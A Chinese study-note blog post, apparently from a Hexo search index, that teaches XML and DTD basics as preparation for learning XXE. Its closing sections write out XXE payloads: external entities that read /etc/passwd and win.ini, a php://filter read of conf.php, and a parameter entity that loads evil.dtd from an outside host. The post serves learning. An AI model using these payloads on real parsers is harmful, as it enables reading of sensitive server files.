<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>XML学习</title>
      <link href="/2021/09/22/XML%E5%AD%A6%E4%B9%A0/"/>
      <url>/2021/09/22/XML%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>要学习XXE漏洞，所以先学习一下XML</p><span id="more"></span><h2 id="什么是-XML？"><a href="#什么是-XML？" class="headerlink" title="什么是 XML？"></a>什么是 XML？</h2><ul><li>XML 指可扩展标记语言（EXtensible Markup Language）。</li><li>XML 是一种很像HTML的标记语言。</li><li>XML 的设计宗旨是传输数据，而不是显示数据。</li><li>XML 标签没有被预定义。您需要自行定义标签。</li><li>XML 被设计为具有自我描述性。</li><li>XML 是 W3C 的推荐标准。</li></ul><h2 id="XML-和-HTML-之间的差异"><a href="#XML-和-HTML-之间的差异" class="headerlink" title="XML 和 HTML 之间的差异"></a>XML 和 HTML 之间的差异</h2><p>XML 不是 HTML 的替代。</p><p>XML 和 HTML 为不同的目的而设计：</p><ul><li>XML 被设计用来传输和存储数据，其焦点是数据的内容。</li><li>HTML 被设计用来显示数据，其焦点是数据的外观。</li></ul><p>HTML 旨在显示信息，而 XML 旨在传输信息。</p><h2 id="XML树结构"><a href="#XML树结构" class="headerlink" title="XML树结构"></a>XML树结构</h2><h3 id="XML文档实例"><a href="#XML文档实例" class="headerlink" title="XML文档实例"></a>XML文档实例</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;utf-8&#x27;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;utf-8&#x27;?&gt;</span></span><br></pre></td></tr></table></figure><p>这是XML的声明，定义了XML的版本和编码。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这是XML的根元素，XML必须要包含根元素，根元素是其他元素的父元素。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">form</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>位于根元素中的就是其子元素，相同层级上的子元素成为同胞</p><h2 id="XML语法"><a href="#XML语法" class="headerlink" title="XML语法"></a>XML语法</h2><h3 id="XML声明"><a href="#XML声明" class="headerlink" title="XML声明"></a>XML声明</h3><p>XML声明文件是可选部分，如果存在需要放在第一行</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;utf-8&#x27;?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="所有的元素必须要包含一个关闭标签"><a href="#所有的元素必须要包含一个关闭标签" class="headerlink" title="所有的元素必须要包含一个关闭标签"></a>所有的元素必须要包含一个关闭标签</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span><span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>**注:**声明文件不是XML的一部分，所有不需要关闭标签</p><h3 id="XML-标签对大小写敏感"><a href="#XML-标签对大小写敏感" class="headerlink" title="XML 标签对大小写敏感"></a>XML 标签对大小写敏感</h3><p>XML对大小写敏感所有必须要使用一样的大小写</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Message</span>&gt;</span>这是错误的<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>这是正确的<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="XML必须要正确嵌套"><a href="#XML必须要正确嵌套" class="headerlink" title="XML必须要正确嵌套"></a>XML必须要正确嵌套</h3><p>XML不像HTML一样，标签没有正确嵌套也可以。XML中标签必须被正确嵌套</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">i</span>&gt;</span>This text is bold and italic<span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="XML属性必须加引号"><a href="#XML属性必须加引号" class="headerlink" title="XML属性必须加引号"></a>XML属性必须加引号</h3><p>XML中也可以拥有属性，但是必须要加引号，不加引号是错误的。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span> <span class="attr">date</span>=<span class="string">&quot;12/11/2007&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="实体引用"><a href="#实体引用" class="headerlink" title="实体引用"></a>实体引用</h3><p>XML中&lt;是有特殊意义的，它代表一个新元素的开始，所以如果你将&lt;放入XML元素中会发生错误</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>if salary &lt; 1000 then<span class="tag">&lt;/<span class="name">message</span>&gt;</span>           <span class="comment">&lt;!--会生成XML错误--&gt;</span></span><br></pre></td></tr></table></figure><p>为了避免这样的错误，XML规定了使用引用实体代替这些特殊字符</p><p>在 XML 中，有 5 个预定义的实体引用：</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109221507089.png" alt="image-20210922093530763"></p><p><strong>注释：</strong>在 XML 中，只有字符 “&lt;” 和 “&amp;” 确实是非法的。大于号是合法的，但是用实体引用来代替它是一个好习惯。</p><h3 id="XML的注释"><a href="#XML的注释" class="headerlink" title="XML的注释"></a>XML的注释</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML注释--&gt;</span></span><br></pre></td></tr></table></figure><h3 id="XML中的空格会被保留"><a href="#XML中的空格会被保留" class="headerlink" title="XML中的空格会被保留"></a>XML中的空格会被保留</h3><p>HTML会将代码中的多个空格合并为一个，而XML不会</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTML:</span><br><span class="line">hello             word</span><br><span class="line">====&gt;</span><br><span class="line">hello word</span><br><span class="line"></span><br><span class="line">XML:</span><br><span class="line">hello             word</span><br><span class="line">=====&gt;</span><br><span class="line">hello             word</span><br></pre></td></tr></table></figure><h2 id="XML元素"><a href="#XML元素" class="headerlink" title="XML元素"></a>XML元素</h2><p>XML文档包含XML元素</p><h3 id="什么是XML元素"><a href="#什么是XML元素" class="headerlink" title="什么是XML元素"></a>什么是XML元素</h3><p>XML 元素指的是从（且包括）开始标签直到（且包括）结束标签的部分。</p><p>一个元素可以包含：</p><ul><li>其他元素</li><li>文本</li><li>属性</li><li>或混合以上所有…</li></ul><h2 id="XML-命名规则"><a href="#XML-命名规则" class="headerlink" title="XML 命名规则"></a>XML 命名规则</h2><p>XML 元素必须遵循以下命名规则：</p><ul><li>名称可以包含字母、数字以及其他的字符</li><li>名称不能以数字或者标点符号开始</li><li>名称不能以字母 xml（或者 XML、Xml 等等）开始</li><li>名称不能包含空格</li></ul><p>可使用任何名称，没有保留的字词。</p><h2 id="XML属性"><a href="#XML属性" class="headerlink" title="XML属性"></a>XML属性</h2><p>XML元素具有属性，属性可以提供元素以外的东西。属性名和元素名一样XML都没有规定，自己定义就行。</p><p>属性通常提供不属于数据组成部分的信息。在下面的实例中，文件类型与数据无关，但是对需要处理这个元素的软件来说却很重要：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">file</span> <span class="attr">type</span>=<span class="string">&quot;gif&quot;</span>&gt;</span>computer.gif<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="XML属性必须加引号-1"><a href="#XML属性必须加引号-1" class="headerlink" title="XML属性必须加引号"></a>XML属性必须加引号</h3><p>XML属性可以使用单引号也可以使用双引号，或者是XML实体</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">person</span> <span class="attr">sex</span> = <span class="string">&quot;female&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">person</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">person</span> <span class="attr">sex</span> = <span class="string">&#x27;female&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">person</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">person</span> <span class="attr">sex</span> = <span class="string">&quot;George <span class="symbol">&amp;quot;</span>Shotgun<span class="symbol">&amp;quot;</span> Ziegler&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">person</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="避免XML属性"><a href="#避免XML属性" class="headerlink" title="避免XML属性"></a>避免XML属性</h3><p>在XML中，能够使用元素尽量不要使用元素。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">person</span> <span class="attr">sex</span>=<span class="string">&quot;female&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">firstname</span>&gt;</span>Anna<span class="tag">&lt;/<span class="name">firstname</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lastname</span>&gt;</span>Smith<span class="tag">&lt;/<span class="name">lastname</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">person</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">person</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sex</span>&gt;</span>female<span class="tag">&lt;/<span class="name">sex</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">firstname</span>&gt;</span>Anna<span class="tag">&lt;/<span class="name">firstname</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lastname</span>&gt;</span>Smith<span class="tag">&lt;/<span class="name">lastname</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">person</span>&gt;</span></span><br></pre></td></tr></table></figure><p>因使用属性而引起的一些问题：</p><ul><li>属性不能包含多个值（元素可以）</li><li>属性不能包含树结构（元素可以）</li><li>属性不容易扩展（为未来的变化）</li></ul><p>不要做这样的蠢事（这不是 XML 应该被使用的方式）：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span> <span class="attr">day</span>=<span class="string">&quot;10&quot;</span> <span class="attr">month</span>=<span class="string">&quot;01&quot;</span> <span class="attr">year</span>=<span class="string">&quot;2008&quot;</span> <span class="attr">to</span>=<span class="string">&quot;Tove&quot;</span> <span class="attr">from</span>=<span class="string">&quot;Jani&quot;</span> <span class="attr">heading</span>=<span class="string">&quot;Reminder&quot;</span> <span class="attr">body</span>=<span class="string">&quot;Don&#x27;t forget me this weekend!&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当XML需要是用ID进行标识XML元素的时候可以使用属性进行标识，其他时候请尽量使用元素。</p><h2 id="XML验证"><a href="#XML验证" class="headerlink" title="XML验证"></a>XML验证</h2><p>拥有正确语法的 XML 被称为”形式良好”的 XML。</p><p>通过 DTD 验证的XML是”合法”的 XML。</p><h3 id="验证XML文档"><a href="#验证XML文档" class="headerlink" title="验证XML文档"></a>验证XML文档</h3><p>合法的 XML 文档是”形式良好”的 XML 文档，这也符合文档类型定义（DTD）的规则：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note SYSTEM &quot;Note.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Tove&lt;/to&gt;</span><br><span class="line">&lt;from&gt;Jani&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&#x27;t forget me this weekend!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><p>在上面的实例中，DOCTYPE 声明是对外部 DTD 文件的引用。下面的段落展示了这个文件的内容。</p><p>DTD 的目的是定义 XML 文档的结构。它使用一系列合法的元素来定义文档结构：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE note</span><br><span class="line">[</span><br><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><h2 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h2><p>DTD的作用是用来定义XML文档的合法构建模块</p><p>DTD可以被声明在XML文档内，也可以通过外部引用来调用</p><h3 id="内部的DOCTYPE声明"><a href="#内部的DOCTYPE声明" class="headerlink" title="内部的DOCTYPE声明"></a>内部的DOCTYPE声明</h3><p>如果DTD被定义到XML文档内部</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!DOCTYPE root-element [element-declarations]&gt;</span><br></pre></td></tr></table></figure><p>XML文档实例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Tove&lt;/to&gt;</span><br><span class="line">&lt;from&gt;Jani&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&#x27;t forget me this weekend&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><ul><li><code>!DOCTYPE note</code>定义了文档的类型，以<code>[</code>为开始<code>]</code>结束。其实就是note是根元素</li><li><code>!ELEMENT note</code> 定义了note元素中的子元素:”to、from、heading,、body”</li><li><code>!ELEMENT to</code>定义to元素为<code>#PCDATA</code> 类型</li><li><code>!ELEMENT from</code>定义from元素为 <code>#PCDATA</code>类型</li><li><code>!ELEMENT heading</code>定义heading 元素为 <code>#PCDATA</code>类型</li><li><code>!ELEMENT body</code>定义body 元素为 <code>#PCDATA</code>类型</li></ul><h3 id="外部文档声明"><a href="#外部文档声明" class="headerlink" title="外部文档声明"></a>外部文档声明</h3><p>DTD位于XML文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE root-element SYSTEM &quot;filename&quot;&gt;</span><br></pre></td></tr></table></figure><p>外部引用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">  &lt;to&gt;Tove&lt;/to&gt;</span><br><span class="line">  &lt;from&gt;Jani&lt;/from&gt;</span><br><span class="line">  &lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">  &lt;body&gt;Don&#x27;t forget me this weekend!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><p>这是包含 DTD 的 “note.dtd” 文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure><h3 id="PCDATA"><a href="#PCDATA" class="headerlink" title="PCDATA"></a>PCDATA</h3><p>PCDATA 的意思是被解析的字符数据（parsed character data）。</p><p>可把字符数据想象为 XML 元素的开始标签与结束标签之间的文本。</p><p>PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记.</p><p>文本中的标签会被当作标记来处理，而实体会被展开。</p><p>不过，被解析的字符数据不应当包含任何 &amp;、&lt; 或者 &gt; 字符；需要使用 <code>&amp;amp;</code>、<code>&amp;lt; </code>以及<code> &amp;gt;</code> 实体来分别替换它们。</p><h3 id="CDATA"><a href="#CDATA" class="headerlink" title="CDATA"></a>CDATA</h3><p>CDATA 的意思是字符数据（character data）。</p><p>CDATA 是不会被解析器解析的文本。在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。</p><h2 id="DTD元素"><a href="#DTD元素" class="headerlink" title="DTD元素"></a>DTD元素</h2><p>在一个 DTD 中，元素通过元素声明来进行声明。</p><h3 id="声明一个元素"><a href="#声明一个元素" class="headerlink" title="声明一个元素"></a>声明一个元素</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT element-name category&gt;</span><br><span class="line">或</span><br><span class="line">&lt;!ELEMENT element-name (element-content)&gt;</span><br></pre></td></tr></table></figure><h3 id="空元素"><a href="#空元素" class="headerlink" title="空元素"></a>空元素</h3><p>空元素通过使用类别关键字EMPTY进行声明</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT element-name EMPTY&gt;</span><br></pre></td></tr></table></figure><p>实例:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT br EMPTY&gt;                &lt;!--br是元素名--&gt;</span><br><span class="line">XML example:</span><br><span class="line">&lt;br /&gt;</span><br></pre></td></tr></table></figure><h3 id="只有-PCDATA-的元素"><a href="#只有-PCDATA-的元素" class="headerlink" title="只有 PCDATA 的元素"></a>只有 PCDATA 的元素</h3><p>只有PCDATA的元素通过圆括号中的#PCDATA进行声明</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT element-name (#PCDATA)&gt;</span><br><span class="line">实例</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br></pre></td></tr></table></figure><h3 id="带有任何内容的元素"><a href="#带有任何内容的元素" class="headerlink" title="带有任何内容的元素"></a>带有任何内容的元素</h3><p>通过ANY声明的元素，可以包含任何可解析数据的组合</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMNET element-name ANY&gt;</span><br><span class="line">实例</span><br><span class="line">&lt;!ELEMENT note ANY&gt;</span><br></pre></td></tr></table></figure><h3 id="DTD中的一些重要的关键字："><a href="#DTD中的一些重要的关键字：" class="headerlink" title="DTD中的一些重要的关键字："></a>DTD中的一些重要的关键字：</h3><ul><li>DOCTYPE（DTD的声明）</li><li>ENTITY（实体的声明）</li><li>SYSTEM、PUBLIC（外部资源申请）</li></ul><h2 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h2><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</p><ul><li>实体引用是对实体的引用。</li><li>实体可在内部或外部进行声明。</li></ul><h3 id="内部实体声明"><a href="#内部实体声明" class="headerlink" title="内部实体声明"></a>内部实体声明</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY entity-name &quot;entity-value&quot;&gt;</span><br></pre></td></tr></table></figure><p>实例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe &quot;Thinking&quot;&gt;]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;      &lt;!--注意这里调用实体需要&amp;xxe;--&gt;</span><br></pre></td></tr></table></figure><p>一个实体由三部分构成：&amp;符号、实体名称、分号(；)，这里&amp;不管在GET还是在POST中都需要进行URL编码，因为是使用参数传入XML的，&amp;符号会被认为是参数间的连接符号。</p><h3 id="外部实体声明"><a href="#外部实体声明" class="headerlink" title="外部实体声明"></a>外部实体声明</h3><p>XML中对数据的引用称为实体，实体中有一类叫外部实体，用来引入外部资源，有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机，外部实体的引用可以借助各种协议，比如如下的三种：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file:///path/to/file.ext</span><br><span class="line">http://url</span><br><span class="line">php://filter/read=convert.base64-encode/resource=conf.php</span><br></pre></td></tr></table></figure><p>实体声明</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY entity-name SYSTEM &quot;URI/URL&quot;&gt;</span><br></pre></td></tr></table></figure><p>外部引用可支持http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，具体内容如下所示：</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109221507116.png" alt="image-20210922144608178"></p><p>实例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">    </span><br><span class="line">&lt;!ELEMENT name ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><p>这种写法则调用了本地计算机的文件<code>/etc/passwd</code>，XML内容被解析后，文件内容便通过<code>&amp;xxe</code>被存放在了<code>name</code>元素中，造成了敏感信息的泄露。</p><h3 id="参数实体声明"><a href="#参数实体声明" class="headerlink" title="参数实体声明"></a>参数实体声明</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % entity-name &quot;entity-value&quot;&gt;</span><br><span class="line">or</span><br><span class="line">&lt;!ENTITY % entity-name SYSTEM “URI”&gt;</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY  % xxe SYSTEM &quot;http://xxx.xxx.xxx/evil.dtd&quot; &gt;]&gt;</span><br><span class="line">&lt;foo&gt;&amp;evil;&lt;/foo&gt;</span><br></pre></td></tr></table></figure><p>外部evil.dtd中的内容。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY evil SYSTEM “file:///c:/windows/win.ini” &gt;</span><br></pre></td></tr></table></figure><h3 id="引用公共实体"><a href="#引用公共实体" class="headerlink" title="引用公共实体"></a>引用公共实体</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY entity-name PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://www.cnblogs.com/zhaijiahui/p/9147595.html">https://www.cnblogs.com/zhaijiahui/p/9147595.html</a></li><li><a href="https://www.runoob.com/xml/xml-tutorial.html">https://www.runoob.com/xml/xml-tutorial.html</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> XML </tag>
            
            <tag> DTD </tag>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>37WEB漏洞-反序列化之PHP</title>
      <link href="/2021/09/21/37WEB%E6%BC%8F%E6%B4%9E-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP/"/>
